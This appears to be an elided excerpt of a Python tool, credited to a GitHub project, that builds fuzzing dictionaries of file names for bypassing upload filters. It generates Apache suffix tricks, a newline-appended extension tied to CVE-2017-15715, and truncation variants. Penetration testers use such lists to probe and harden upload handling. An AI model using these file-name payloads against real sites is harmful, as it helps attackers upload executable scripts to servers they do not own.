...
原github: https://github.com/c0ny1/upload-fuzz-dic-builder
...
def apache_suffix_creater(suffix):
    ...
    for l in suffix:
        str = '{}.xxx'.format(l)
        res.append(str)
        str = '{}{}'.format(l, urllib.parse.unquote('%0a'))  # CVE-2017-15715
        res.append(str)
    return res
...
def str_00_truncation(suffix,allow_suffix):
	...
	for i in suffix:
		...
		res.append(str)
		str = '%s%s.%s' % (i, urllib.parse.unquote('%0a'), allow_suffix)
		res.append(str)
	return res
